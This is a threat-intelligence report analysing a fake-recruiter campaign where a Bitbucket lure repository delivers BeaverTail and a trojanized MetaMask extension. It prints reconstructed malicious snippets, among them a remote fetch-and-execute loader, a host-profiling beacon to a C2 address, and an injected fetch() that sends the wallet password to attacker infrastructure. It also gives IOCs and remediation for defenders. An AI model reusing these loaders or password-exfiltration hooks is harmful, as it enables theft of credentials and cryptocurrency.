---
title: "Wallet Trap: BeaverTail and Trojanized MetaMask via Fake Developer Assignment"
date: 2026-03-24
author: "ThreatProphet"
description: "Analysis of a Contagious Interview-aligned campaign delivering BeaverTail via a Bitbucket lure repository, culminating in a trojanized MetaMask extension that exfiltrates the victim's wallet master password."
tags:
  - dprk-linked
  - contagious-interview
  - beavertail
  - metamask
  - javascript
  - linkedin-lure
  - jsonkeeper
  - node-js
  - crypto-stealer
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1027
  - T1105
  - T1059.007
  - T1555.003
  - T1056.002
  - T1041
  - T1048.003
  - T1115
  - T1036.005
  - T1497.001
report_id: "TP-2026-007"
showToc: true
---

> *"The rite began with promise and ended in defilement."*

## Executive Summary

A threat actor operating a fake recruiter persona on LinkedIn targeted developers with a bogus technical assignment. The lure repository (**mocorex**) was hosted on Bitbucket under the fabricated organisation **fortegroup-org**, using a plausible corporate naming pattern rather than a verified legitimate company identity. The project presented as a standard React/Vite web application, complete with plausible component structure and a commit history spanning multiple apparent contributors. Concealed within it was a horizontally indented loader, `public/vite.cookie.js`, designed to evade casual code review by pushing the staging call off-screen in a normal editor viewport. In the preserved sample, the staging call appears on line 529 after 380 leading horizontal whitespace characters.

At runtime, the loader fetched a BeaverTail payload from **jsonkeeper[.]com/b/5SA4R**, a legitimate JSON storage service that has been reported as a staging option in Contagious Interview activity. The Stage 2 payload was delivered through the JSON `cookie` field, consistent with documented JSON-staged BeaverTail delivery patterns, and deployed a broad infostealer capability set: host fingerprinting, platform-specific VM detection, persistent clipboard monitoring targeting cryptocurrency wallet addresses, and direct harvesting of 50 hardcoded browser-based crypto wallet extensions across up to 100 Chrome profiles. On macOS, it escalated further into a multi-stage trojanisation chain.

The macOS chain replaced the victim's **Google Chrome** installation with a malicious build and deployed a cloned **MetaMask 13.16.0** extension as a sideloaded component. This component added a targeted credential theft layer on top of the broader infostealer: a single `fetch()` call inserted into MetaMask's password submission handler sent the wallet master password in plaintext to operator infrastructure at `146.70.24[.]211:4553/api/dech_result` during unlock handling. Where the attacker also possesses the relevant MetaMask vault material, the password can be used to decrypt the vault and recover the seed phrase or private-key material for wallets derived from it. File exfiltration from harvested wallet and browser data was routed separately to a third C2 host at `184.174.97[.]8` across two ports, suggesting distinct backend processing pipelines for different data types.

Three distinct C2 IPs were extracted across the payload stages: `45.61.130[.]84` (beacon and logging), `146.70.24[.]211` (payload delivery and password exfiltration), and `184.174.97[.]8` (file exfiltration, ports 4556 and 4558). All three share a hardcoded campaign UID of `a3c65c2974270fd093ee8a9bf8ae7d0b`, enabling cross-victim correlation. Notably, `184.174.97[.]8` was not recoverable via string decoding alone; the IP was constructed entirely from numeric hex constants assembled at runtime, bypassing string-based static analysis. Infrastructure fingerprinting of `45.61.130[.]84` leaked a Windows Server path (`C:\Users\Administrator\Documents\script-server\`) consistent with previously documented Contagious Interview operator infrastructure patterns. TTPs are consistent with **DPRK-linked Contagious Interview-aligned** activity as documented by multiple vendors; attribution is assessed at **medium confidence** based on lure pattern, malware family, staging technique, and terminal cryptocurrency-theft objective.

---

## Evidence Basis and Scope

This report is based on preserved repository content, recovered JSONkeeper payload material, decoded BeaverTail strings and runtime-assembled indicators, retrieved macOS payload archives, extracted trojanized MetaMask extension files, Git commit metadata, and C2 probe responses captured during the investigation. The public report does not distribute the private evidence archive. Hashes are included where useful for independent comparison with collected samples, repository mirrors, payload captures, and extracted extension artifacts.

The analysis distinguishes between directly observed evidence and inference:

- directly observed: repository files, execution trigger, JSONkeeper staging response, BeaverTail behavior visible in decoded code, C2 endpoints embedded or constructed by the payload, retrieved DMG/ZIP payloads, and the injected MetaMask `ui-20.js` password-submission hook;
- inferred: backend role separation between the three C2 IPs and the operator workflow behind the trojanized browser/extension chain;
- external context: public reporting on Contagious Interview, BeaverTail, JSON-storage staging, and DPRK-linked developer-targeting tradecraft.

## Attack Overview

### Initial Contact

I was approached on LinkedIn by a persona presenting as a recruiter for a Web3 company. The lure followed the now-standard Contagious Interview pattern: a multi-stage interview process concluding with a "technical assignment", in this case cloning and running the **mocorex** repository hosted on Bitbucket under the fabricated organisation account **fortegroup-org**. The project was presented as a frontend application requiring review and minor modification, a common framing chosen to justify running `npm install` locally.

The organisation name `fortegroup-org` does not correspond to any identifiable legitimate entity. The naming convention (a plausible corporate name combined with a `-org` suffix) is consistent with account pre-staging practices documented in prior Contagious Interview campaigns.

### Kill Chain

1. Victim is contacted on LinkedIn by a fake recruiter and directed to clone `bitbucket[.]org/fortegroup-org/mocorex`.
2. Running Vite-backed project commands causes the JavaScript runtime to load `public/vite.cookie.js`, a loader disguised as a Vite development utility. The preserved `package.json` maps `dev` to `vite --port 8080 --open`, `build` to `vite build`, and `preview` to `vite preview`; those commands load `vite.config.js`, which requires the loader. Plain `npm install` is not confirmed as a standalone execution trigger in the preserved evidence unless paired with instructions or tooling that invokes Vite.
3. The loader fetches obfuscated BeaverTail JavaScript from `jsonkeeper[.]com/b/5SA4R` (the `cookie` field) and executes it via `new Function('require', payload)(require)`.
4. BeaverTail beacons to `45.61.130[.]84/api/service/process/<uid>` with host profile data (OS, hostname, platform, user info) and a hardcoded campaign UID.
5. BeaverTail initiates clipboard monitoring (polling every 500ms) and exfiltrates any clipboard changes to `45.61.130[.]84/api/service/makelog`.
6. On macOS, BeaverTail downloads an XZ-compressed DMG from `146.70.24[.]211:4553/api/dd`, kills Google Chrome, renames `/Applications/Google Chrome.app` to `/Applications/tempapp`, and installs the trojanized Chrome in its place.
7. Concurrently, a ZIP archive is downloaded from `146.70.24[.]211:4553/api/dm` and extracted to `~/Library/Caches/com.apple.chromo`, a disguised path chosen to blend with legitimate Apple cache directories.
8. The trojanized Chrome loads the fake MetaMask extension from `com.apple.chromo` instead of the legitimate installed version.
9. The next time the victim unlocks MetaMask, their master password is silently exfiltrated via HTTP POST to `146.70.24[.]211:4553/api/dech_result`.

---

## Technical Analysis

### Stage 1: Loader (`public/vite.cookie.js`)

The malicious loader is placed in the `public/` directory of the Vite project, a location that can appear benign during superficial frontend review. The filename `vite.cookie.js` is chosen to mimic a legitimate Vite development plugin, a naming convention developers working with the framework would find unremarkable.

The file employs horizontal whitespace obfuscation. The preserved sample is 4,675 bytes across 626 lines. The longest line is line 529, where the JSONkeeper staging request begins after 380 leading horizontal whitespace characters; the `new Function` execution sink appears later in the same loader. This pushes the malicious content outside a normal editor viewport without horizontal scrolling while leaving a benign-looking `console.log("Loading cookie data...")` at the visible top of the file.

**Execution trigger: `vite.config.js`**

The loader is not self-executing. The preserved project scripts confirm that Vite-backed commands load the configuration and trigger the malicious require path:

```text
dev: vite --port 8080 --open
build: vite build
lint: eslint .
preview: vite preview
```

The final `vite.config.js` contains the trigger at line 9:

```javascript
const { defineConfig } = require("vite");
const react = require("@vitejs/plugin-react-swc");
const path = require("path");

module.exports = defineConfig(async ({ mode }) => {
  require('./public/vite.cookie');
  // Only load componentTagger in development mode using dynamic import
  ...
});
```

The call is placed at the top level of the config module, outside any conditional block, so it executes whenever Vite loads the config. This includes `npm run dev`, `npm run build`, and `npm run preview`; `npm run lint` does not load Vite and is not an execution trigger based on the preserved scripts.

The repository history contains multiple persona-style authors. The preserved HEAD is merge commit `31ea638fde20a03052b46490faa3e7e431ac6f8f`, authored by `Fabian <Fabian@chainsquad.com>` on 2026-03-02, with subject `Merge branch 'dnaleor' into main`. Author identities should therefore be treated as repository persona artifacts for clustering, not as reliable real-world identity indicators.

**Payload fetch and execution**

At runtime, the loader fetches its payload from the JSONkeeper staging URL and executes it:

```javascript
// Reconstructed loader logic (simplified)
fetch("hxxps://jsonkeeper[.]com/b/5SA4R")
  .then(r => r.json())
  .then(d => new Function('require', d.cookie)(require));
```

The `cookie` key name in the JSON response is consistent with JSON-staged BeaverTail delivery described in public reporting. It should be treated as a payload-family indicator when combined with the decoded code behavior, not as a sufficient standalone family signature.

### Stage 2: BeaverTail Payload

The Stage 2 payload retrieved from `jsonkeeper[.]com/b/5SA4R` is a heavily obfuscated BeaverTail variant. Obfuscation is implemented via a custom multi-alphabet base-encoding scheme: a constant lookup table (`uQH0eUH`) replaces all numeric literals, and all string literals are stored in a single encoded array (`_94vf9`) decoded at runtime by one of six independent decoder functions, each using a distinct scrambled alphabet string. This per-block alphabet variation is consistent with anti-signature hardening observed in newer BeaverTail reporting and reduces the utility of static rules that rely on one fixed decoder pattern.

A self-nullifying no-op function (`vlQxR3`) overwrites itself on first call, preventing re-execution and complicating dynamic analysis. Multiple redundant `try/catch` blocks each embed an independent decoder instance, providing resilience against parse-time errors in sandboxed environments.

Static extraction of the decoded string array revealed the full capability set:

**Host profiling and beaconing:**

```javascript
// Victim registration beacon
axios.post("hxxp://45.61.130[.]84/api/service/process/" + uid, {
  OS: os.type(),
  platform: os.platform(),
  release: os.release() + (isVM ? " (VM)" : "(Local)"),
  host: os.hostname(),
  userInfo: os.userInfo(),
  uid: uid,
  t: 1  // hardcoded campaign flag
});
```

The campaign UID `a3c65c2974270fd093ee8a9bf8ae7d0b` is hardcoded across all stages and sent with every outbound request, enabling the operator to correlate data from multiple victims on the same C2 panel.

**Anti-static-analysis: numeric constant IP assembly**

A third C2 IP (`184.174.97[.]8`) was not stored as a string anywhere in the payload and was therefore not recoverable by the string decoder alone. Instead, the IP was constructed entirely from hex integer constants and a separator character fetched from the `uQH0eUH` lookup table:

```javascript
// IP octets as hex integer constants
const qAe1Vp  = 0xb8;            // 184
const qUGwra  = 0xae;            // 174
const nwDAQSn = 0x61;            // 97
const cFpXnq  = uQH0eUH[0x2];   // 8  (from constant lookup table)

// Separator "." stored as uQH0eUH[0x12] in the constant table
const X9gtI3O = "" + qAe1Vp  + uQH0eUH[0x12]
                   + qUGwra  + uQH0eUH[0x12]
                   + nwDAQSn + uQH0eUH[0x12]
                   + cFpXnq;
// → "184.174.97[.]8"

// Ports as hex integer literals
const cY0l18Q = 0x11cc;  // 4556
const dely_ky = 0x11ce;  // 4558
```

The assembled variables (`X9gtI3O`, `cY0l18Q`, `dely_ky`) were then injected into the inner process spawn payloads at runtime, where they appeared as fully resolved strings only at the point of execution, invisible to any analysis that operates on encoded string arrays alone. This technique specifically defeats extractors that target the `_94vf9` string pool, and is consistent with the progressive hardening of BeaverTail's obfuscation documented in Microsoft's March 2026 report. The complete upload endpoint construction:

```javascript
// Process 2 and 3 spawn payload
const uu = "http://" + X9gtI3O + ":" + cY0l18Q + "/upload";
// → "hxxp://184.174.97[.]8:4556/upload"

// Process 4 spawn payload  
const uu = "http://" + X9gtI3O + ":" + dely_ky + "/upload";
// → "hxxp://184.174.97[.]8:4558/upload"
```

The two ports indicate at least two separate upload branches on the same host. Any backend separation by data type or victim queue remains an inference unless corroborated by server-side evidence.

**VM detection:** Before proceeding, BeaverTail performs active environment checks across all three supported platforms:

| Platform | Method | Indicators Checked |
|---|---|---|
| Windows | `wmic computersystem get model,manufacturer` | `vmware`, `virtualbox`, `qemu`, `microsoft corporation` |
| macOS | `system_profiler SPHardwareDataType` | `/vmware\|virtualbox\|qemu\|parallels\|virtual/i` |
| Linux | `readFileSync('/proc/cpuinfo')` | `hypervisor`, `vmware`, `virtualbox`, `qemu`, `kvm`, `xen`, `parallels`, `bochs` |

If a VM is detected, the operator is notified via the `(VM)` suffix appended to the OS release string in the beacon, but execution continues. This supports the assessment that sandboxed or virtualized hosts can be labelled for later filtering without necessarily halting execution.

**Clipboard monitoring:** A `setInterval` loop polls the clipboard every 500ms using platform-native commands (`pbpaste` on macOS, `powershell Get-Clipboard` on Windows). Any change is debounced 500ms and exfiltrated to the makelog endpoint. This capability is well suited to intercepting cryptocurrency wallet addresses copied during transaction workflows.

**Wallet extension harvesting:** Fifty browser extension IDs are hardcoded, covering every major cryptocurrency wallet available as a Chrome extension. The payload iterates up to 100 Chrome user profiles, reads `Preferences` and `Secure Preferences` for each, enables developer mode (`extensions.ui.developer_mode = true`), and uses a deterministic machine ID to decrypt `Secure Preferences`, extracting encrypted vault data directly from the browser profile filesystem.

### Stage 3a: Trojanized Chrome (macOS)

On macOS, BeaverTail executes the following sequence after a 3-second initial delay:

1. Downloads XZ-compressed DMG from `146.70.24[.]211:4553/api/dd` to a temporary path.
2. Kills the running Google Chrome process via `killall -9 "Google Chrome"`.
3. Renames `/Applications/Google Chrome.app` to `/Applications/tempapp` (preserving the legitimate binary as cover).
4. Mounts the DMG via `hdiutil attach` and installs the contained `.app` bundle to `/Applications`, replacing Chrome.
5. Deletes the DMG.

The trojanized Chrome is installed in place of the legitimate application. Visual similarity should be assessed from preserved binaries and UI behavior; this report does not rely on user-interface similarity as an attribution indicator.

### Stage 3b: Trojanized MetaMask Extension

Concurrently, a ZIP archive downloaded from `146.70.24[.]211:4553/api/dm` is extracted to `~/Library/Caches/com.apple.chromo`. This archive contains a cloned MetaMask 13.16.0 extension tree with a targeted modification identified in `ui-20.js`. The extracted manifest identifies the extension as MetaMask, manifest version 3, minimum Chrome version 115, and version `13.16.0`. File timestamps reveal the operator's precise changes:

| Timestamp | Files | Nature |
|---|---|---|
| `2016-07-13 17:00` | All 1,400+ legitimate MetaMask files | Unmodified, taken directly from an official MetaMask build (npm pack epoch timestamp) |
| `2026-02-02 23:35/36` | `manifest.json`, all `_locales/*/messages.json` | Operator-modified localisation and manifest |
| `2026-02-18 04:43` | `ui-20.js` | **Malicious injection** |

The sole malicious modification is a single `fetch()` call injected into the `handleSubmit` method of `unlock-page.component.tsx`, executed before any legitimate unlock logic:

```javascript
// Injected code inside handleSubmit, module 8212 of ui-20.js
S(this, "handleSubmit", async e => {
  e.preventDefault();
  e.stopPropagation();
  const { password: t } = this.state;

  // Exfiltrate password before unlock
  fetch("hxxp://146.70.24[.]211:4553/api/dech_result", {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      data: t,                  // MetaMask master password, plaintext
      uid: navigator.platform,  // OS platform fingerprint
      pname: Date.now()         // timestamp
    })
  });

  // Legitimate MetaMask unlock logic continues normally...
```

The injected call occurs before the legitimate unlock logic continues. No explicit user-facing warning is visible in the injected code path. If the attacker obtains the corresponding vault material, the captured master password can be used to decrypt MetaMask wallet data and recover seed or private-key material.

### C2 Infrastructure Fingerprint

Probing `45.61.130[.]84` on port 80 returned a 404 error page that leaked an Express.js server path:

```
Error: ENOENT: no such file or directory,
stat 'C:\Users\Administrator\Documents\script-server\client\build\index.html'
```

This indicates a Windows-hosted Express.js application using a `script-server` directory layout. It is a useful infrastructure fingerprint, but not sufficient by itself for attribution.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruiter lure and technical-assignment delivery |
| T1204.002 | User Execution: Malicious File | Execution | Victim runs Vite-backed project commands that load the malicious config-triggered loader |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Execution | `new Function('require', payload)(require)` executes the JSONkeeper-delivered JavaScript payload |
| T1059.004 | Unix Shell | Execution | macOS chain uses shell tooling such as `killall` and `hdiutil` during Chrome replacement |
| T1027 | Obfuscated Files or Information | Defense Evasion | Horizontal whitespace concealment in `vite.cookie.js`; multi-alphabet BeaverTail encoding; runtime-assembled IP address |
| T1105 | Ingress Tool Transfer | Command and Control | JSONkeeper BeaverTail fetch; DMG and ZIP retrieval from operator infrastructure |
| T1555.003 | Credentials from Web Browsers | Credential Access | Browser and wallet-extension profile data targeted, including MetaMask-related material |
| T1056.002 | Input Capture: GUI Input Capture | Credential Access | Trojanized MetaMask unlock handler captures submitted master password |
| T1115 | Clipboard Data | Collection | Clipboard polling via `pbpaste` and PowerShell clipboard access |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion | `public/vite.cookie.js`, `~/Library/Caches/com.apple.chromo`, and Chrome/MetaMask replacement artifacts mimic legitimate locations/components |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | Defense Evasion | VM/sandbox checks across Windows, macOS, and Linux label execution environment |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Host data, clipboard data, and password material sent to operator-controlled endpoints |
| T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol | Exfiltration | Plain HTTP upload endpoints on non-standard ports, including file-exfiltration branches |

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `45.61.130[.]84` | IPv4 | C2 - victim registration and makelog beacon; Express.js; Windows Server |
| `146.70.24[.]211` | IPv4 | C2 - Stage 3 payload delivery and password exfiltration; port 4553 |
| `184.174.97[.]8` | IPv4 | C2 - file exfiltration server; ports 4556 and 4558; IP assembled from numeric constants at runtime |
| `jsonkeeper[.]com/b/5SA4R` | URL | Stage 2 BeaverTail staging - JSONkeeper |
| `45.61.130[.]84/api/service/process/<uid>` | URL | Victim registration endpoint |
| `45.61.130[.]84/api/service/makelog` | URL | Logging/clipboard exfiltration endpoint |
| `146.70.24[.]211:4553/api/dd` | URL | Trojanized Chrome DMG/XZ download |
| `146.70.24[.]211:4553/api/dm` | URL | Trojanized MetaMask ZIP download |
| `146.70.24[.]211:4553/api/dech_result` | URL | MetaMask password exfiltration endpoint |
| `146.70.24[.]211:4553/api/uspf` | URL | Additional observed endpoint in payload-derived IOC extraction; function not independently confirmed |
| `146.70.24[.]211:4553/upload` | URL | Additional observed upload endpoint; function not independently confirmed |
| `184.174.97[.]8:4556/upload` | URL | File exfiltration - Process 2/3 branch |
| `184.174.97[.]8:4558/upload` | URL | File exfiltration - Process 4 branch |
| `api[.]mocorex[.]com/api` | Domain/path | Lure application API reference, not classified as malware C2 without additional evidence |

### Repository Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket[.]org/fortegroup-org/mocorex` | Repository | Primary lure repository |
| `fortegroup-org` | Bitbucket account | Fabricated organisation |
| `public/vite.cookie.js` | File path | Stage 1 loader - horizontal whitespace obfuscation |
| `31ea638fde20a03052b46490faa3e7e431ac6f8f` | Commit | Preserved repository HEAD, merge of `dnaleor` branch into `main` |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| `45.61.130[.]84` | IPv4 | High |
| `146.70.24[.]211` | IPv4 | High |
| `184.174.97[.]8` | IPv4 | High - assembled from numeric constants; not recoverable via string decoding |
| `jsonkeeper[.]com/b/5SA4R` | URL | High |
| `hxxp://45.61.130[.]84/api/service/process/a3c65c2974270fd093ee8a9bf8ae7d0b` | URL | High - campaign UID-specific registration path |
| `hxxp://45.61.130[.]84/api/service/makelog` | URL | High |
| `hxxp://146.70.24[.]211:4553/api/dd` | URL | High |
| `hxxp://146.70.24[.]211:4553/api/dm` | URL | High |
| `hxxp://146.70.24[.]211:4553/api/dech_result` | URL | High |
| `hxxp://184.174.97[.]8:4556/upload` | URL | High |
| `hxxp://184.174.97[.]8:4558/upload` | URL | High |
| `a3c65c2974270fd093ee8a9bf8ae7d0b` | Campaign UID | High - hardcoded in all payload stages |

### File and Payload Hashes

Hashes are included for independent comparison with collected samples, repository mirrors, payload captures, and extracted extension artifacts. The private evidence archive is not distributed with this report.

| SHA256 | Description |
|---|---|
| `3538dca5a5eeb50d26b9ee7c6ad0ea5a63af4fe49b7c9aa242a7b06dce34501d` | `public/vite.cookie.js` - Stage 1 loader, mocorex HEAD |
| `52b3f9eeda915ff2e64687f31c2b095dd83e95d19097de619ff956a1e8a5419c` | `vite.config.js` - execution trigger containing `require('./public/vite.cookie')` |
| `3dd949a7a16db7d6f1a677f6c8abeeca2695e4e95cb6174b69b0e71dcf570bbc` | Stage 2 payload capture with headers - BeaverTail retrieved from JSONkeeper, 2026-03-23 |
| `0ca3a74ac972080a2f7a915044abd81d95338afde17aeae26af6f7a31c16e3ec` | Stage 2 payload capture, second probe - JSONkeeper, 2026-03-23 |
| `5f69913d6292ae9b879536ab8c08c9938ffbed352733ae7896f06d4ab09208cc` | Stage 2 payload body - BeaverTail JSON body |
| `9ff923e481be7714f19a8aad6b4b988fb6370b0e14db131e1c27a47c620446bb` | Stage 3 DMG/XZ - trojanized Chrome, retrieved from `146.70.24[.]211:4553/api/dd`, 2026-03-23 |
| `d552a58a137c0ca1d95f70c6f07a2cbce0d8c0a60bd5ec37d4bad7c97b6bf99a` | Stage 3 ZIP - trojanized MetaMask 13.16.0, retrieved from `146.70.24[.]211:4553/api/dm`, 2026-03-23 |
| `116fa81f492cc851c66fb0bbf4b69165c0d6ddaa163c57c039221761bcefd392` | MetaMask `manifest.json` - extracted from Stage 3 ZIP |
| `a4fb63bdb311b6cecb1f572310f1cc8c30cb85aa8d3ed5a164ec2d39a55c6e9a` | MetaMask `ui-20.js` - contains injected password-exfiltration code |
| `3caed7372c3799e2aad5b207f8dc085b08ec90095ca37cce34a2bb36e6f73bd6` | C2 probe response - `45.61.130[.]84/api/service/makelog`, 2026-03-23 |
| `c4f20ff26e2c9f7c9460943ed7cedd5df6a0cc0d34a097ffd146f1513e810eb4` | C2 probe response - `146.70.24[.]211:4553/api/dech_result`, 2026-03-24 |
| `9bfb1976ecba683c930f68e10216a26f7c4684896b9a66f6201a2ac67f2c28ac` | Git commit log with author metadata |
| `45cb10ac5413a50b8920841ffb79d9b1572d7a81af181834e7ca3fa1b118887a` | Full diff of commit `275d524` - `vite.config.js` execution trigger |

### Host Indicators

| Indicator | Type | Notes |
|---|---|---|
| `~/Library/Caches/com.apple.chromo` | Directory | Trojanized MetaMask extraction path (macOS) |
| `/Applications/tempapp` | Path | Legitimate Chrome renamed here post-compromise (macOS) |
| Chrome extension `nkbihfbeogaeaoehlefnkodbefgpgknn` with modified `ui-20.js` | Extension | Trojanized MetaMask; confirms if SHA256 of `ui-20.js` does not match official MetaMask 13.16.0 release |

### Repository Indicators

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket[.]org/fortegroup-org/mocorex` | Repository | Malicious lure repository |
| `fortegroup-org` | Bitbucket account | Fabricated organisation/persona infrastructure |
| `31ea638fde20a03052b46490faa3e7e431ac6f8f` | Commit | Preserved HEAD; merge commit authored by `Fabian <Fabian@chainsquad.com>`, 2026-03-02T23:59:59+09:00 |
| `Fabian <Fabian@chainsquad.com>` | Git author persona | 25 commits; authored preserved HEAD and commits touching execution artifacts in derived map |
| `dnaleor <dnaleor@gmail.com>` | Git author persona | 31 commits; branch name appears in preserved HEAD merge subject |
| `fsboehme <fsboehme@gmail.com>` | Git author persona | 30 commits |
| `fengshanshan <fengshanshn@icloud.com>` | Git author persona | 19 commits |
| `94873d3f5231c96a77cd0f43bcb41fbda637208a` | Commit | Commit touching `vite.config.js` execution artifact, authored by `Fabian <Fabian@chainsquad.com>` |
| `0f502cc528a22e42a41a68d88d0ebd0f6e0559f0` | Commit | Commit touching `vite.cookie.js` skeleton, authored by `Fabian <Fabian@chainsquad.com>` |
| Horizontal whitespace before payload in JS file | Code pattern | 380 leading horizontal whitespace characters before the JSONkeeper request on line 529 |
| JSONkeeper `cookie` field execution | Code pattern | BeaverTail staging pattern |
| `require('./public/vite.cookie')` in `vite.config.js` | Code pattern | Top-level execution trigger when Vite loads the config |
| `new Function('require', payload)(require)` | Code pattern | BeaverTail execution primitive |

---

## Attribution Assessment

**Assessed confidence: Medium**

This campaign is assessed as **DPRK-linked Contagious Interview-aligned** activity at medium confidence. The assessment is based on tradecraft, malware-family alignment, and campaign objective rather than a confirmed real-world operator identity.

The strongest points are: the LinkedIn recruiter/technical-assignment lure; Bitbucket-hosted developer project delivery; JSONkeeper staging of BeaverTail-like JavaScript payload material; the JSON `cookie` field payload delivery pattern; cross-platform JavaScript execution through `new Function('require', payload)(require)`; explicit cryptocurrency-wallet targeting; and a macOS follow-on chain focused on Chrome and MetaMask compromise. MITRE tracks Contagious Interview as a North Korea-aligned group targeting software developers and cryptocurrency-related users, and MITRE separately documents BeaverTail as a JavaScript/C++ malware family used by North Korea-affiliated Contagious Interview/DeceptiveDevelopment activity.

The trojanized MetaMask component represents a higher-impact terminal capability than simple file harvesting: it targets the unlock workflow itself. However, whether this exact component is unique to this campaign or part of a broader unpublished toolset should remain open until additional samples or third-party reporting corroborate it.

The Git author identities `Fabian <Fabian@chainsquad.com>`, `dnaleor <dnaleor@gmail.com>`, `fsboehme <fsboehme@gmail.com>`, and `fengshanshan <fengshanshn@icloud.com>`, together with the `fortegroup-org` Bitbucket organisation, should be treated as persona and infrastructure artifacts. They are useful for clustering but are not reliable real-world identity indicators.

Attribution should not be asserted beyond this confidence level without additional corroborating intelligence such as shared infrastructure administration, overlapping payload build chains, wallet movement, or independent victim telemetry.

**Prior reporting:**
- [NVISO - Contagious Interview Actors Now Utilize JSON Storage Services](https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/)
- [Microsoft - Contagious Interview: Malware Delivered Through Fake Developer Job Interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/)
- [SANS CTI Summit 2026 - Hunting North Korea's Contagious Interview Operation](https://www.sans.org/presentations/hunting-north-koreas-state-sponsored-contagious-interview-operation-attacks-on-developers-via-the-software-supply-chain)
- [MITRE ATT&CK - Contagious Interview (G1052)](https://attack.mitre.org/groups/G1052/)

## Remediation

### If You Ran the Repository

- **Isolate the machine immediately.** Disconnect from all networks before taking any further action.
- **Preserve forensic evidence.** Memory dump, shell history (`.bash_history`, `.zsh_history`), system logs, and the `~/Library/Caches/com.apple.chromo` directory before remediation.
- **Check for Chrome replacement.** Verify whether `/Applications/tempapp` exists. If it does, your Chrome has been replaced. Do not open the trojanized installation further.
- **Assume your MetaMask master password is compromised.** If you have ever unlocked MetaMask since running the repository, treat the password as known to the attacker.
- **Assume your seed phrase is compromised.** Transfer all assets to wallets generated on a clean, air-gapped machine using a freshly generated seed phrase immediately. Do not reuse any wallet derived from a seed stored in the compromised MetaMask instance.
- **Rotate all credentials.** SSH keys, API tokens, cloud credentials, and all browser-stored passwords accessible from the machine.
- **Audit for persistence.** Check `~/Library/LaunchAgents/`, `~/Library/LaunchDaemons/`, cron jobs, and login items for entries created at or after the time of repository execution.
- **Do not rely on AV/EDR alone.** The payload executes as JavaScript within a legitimate Node.js process and the trojanized Chrome is a signed-looking macOS application. Standard endpoint tools are unlikely to flag either.
- **Reimage.** If compromise is confirmed, restore from a known-good backup predating repository execution, or perform a clean OS install.

### Network-Level Detection

- Block and alert on all outbound connections to `45.61.130[.]84`, `146.70.24[.]211`, and `184.174.97[.]8` (all ports).
- Alert on outbound HTTP (not HTTPS) POST requests from browser processes to non-standard ports, particularly port 4553.
- Alert on HTTP POST requests containing JSON bodies with a `data` field originating from Chrome or Chromium processes to any external IP on a non-standard port.
- Monitor for outbound connections to `jsonkeeper[.]com` from Node.js processes on developer workstations; legitimate use is rare and any such connection should be investigated.
- Create IDS signatures for HTTP requests to `/api/service/makelog`, `/api/service/process/`, `/api/dech_result`, and `/upload` on ports 4556 and 4558.

### Host-Level Detection and Hardening

- Check for the presence of `/Applications/tempapp` and `~/Library/Caches/com.apple.chromo`; either indicates active compromise.
- Verify the SHA256 of `~/Library/Application Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/` against the official MetaMask release for your installed version. Any mismatch indicates a trojanized extension.
- Monitor filesystem events for writes to `~/Library/Caches/com.apple.chromo` and renames of `/Applications/Google Chrome.app`.
- Run developer assessments from unknown sources exclusively in an isolated VM or container with restricted network egress and ephemeral storage. Running install or development commands in an untrusted repository must never be treated as safe.
- Audit all `public/` directory JavaScript files in Vite/React projects for horizontal whitespace anomalies before execution. Malicious code pushed off-screen is invisible without explicit horizontal scroll inspection.


---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-007 | Published: 2026-03-24 | Author: [ThreatProphet](https://threatprophet.com)*
